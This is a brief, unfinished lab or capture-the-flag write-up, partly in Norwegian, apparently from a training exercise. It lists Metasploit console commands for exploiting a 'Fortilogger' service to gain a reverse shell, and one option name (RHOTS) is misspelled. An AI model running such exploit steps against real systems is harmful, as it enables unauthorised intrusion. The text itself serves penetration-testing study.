## Question: Find the existing exploit in MSF and use it to get a shell on the target. What is the username of the user you obtained a shell with?

For å løse denne gjør jeg en rask nmap scan på domenet. Jeg finner prosessen jeg kan exploite, som er "Fortilogger"


`search fortilogger`
<br>
`use 0`
<br>
`set RHOTS *ip*`
<br>
`set LHOST tun0`
<br>
`run`

<br>
<br>

# KOMMER MER INFORMASJON

